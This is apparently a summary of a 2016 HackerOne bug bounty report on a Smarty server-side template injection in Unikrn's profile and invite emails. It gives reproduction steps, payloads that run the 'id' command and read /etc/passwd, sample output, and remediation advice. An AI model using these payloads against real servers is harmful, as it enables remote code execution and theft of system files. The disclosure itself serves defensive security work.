# Title: Urgent: Server Side Template Injection via Smarty Template Allows for RCE

- **Platform**: HackerOne
- **Program**: Unikrn
- **Severity**: Critical
- **Date**: August 29, 2016
- **Researcher**: yaworsk
- **Bounty**: N/A

## Summary
A critical server-side template injection vulnerability was found in Unikrn's Smarty templating engine. By entering a malicious payload as a first name, last name, or nickname and then inviting another user, the payload is executed server-side, leading to Remote Code Execution.

## Technical Details
Unikrn uses the Smarty template engine on the backend for rendering profiles and emails. User-controlled fields are directly embedded into Smarty templates without proper sanitization. Using Smarty's PHP-based template syntax, an attacker can execute arbitrary PHP code on the server.

## Steps to Reproduce
1. Register an account on Unikrn
2. Set first name to `{system('id')}`
3. Invite another user to join the site
4. The invite email triggers template rendering
5. Server executes the injected PHP code

## Proof of Concept
```
Payload used in firstname field: {php}echo file_get_contents('/etc/passwd');{/php}

The email sent to the invited user contains the output of:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

## Impact
Full Remote Code Execution on the server. An attacker could read sensitive files, access databases, modify server configurations, and pivot to internal network resources.

## Remediation
Do not allow user input to be directly concatenated into Smarty templates. Use the Smarty `assign` function to pass variables as data rather than template code. Implement strict input validation and output escaping.

## References
- https://hackerone.com/reports/164224
- https://www.smarty.net/docs/en/variable.escape.tpl
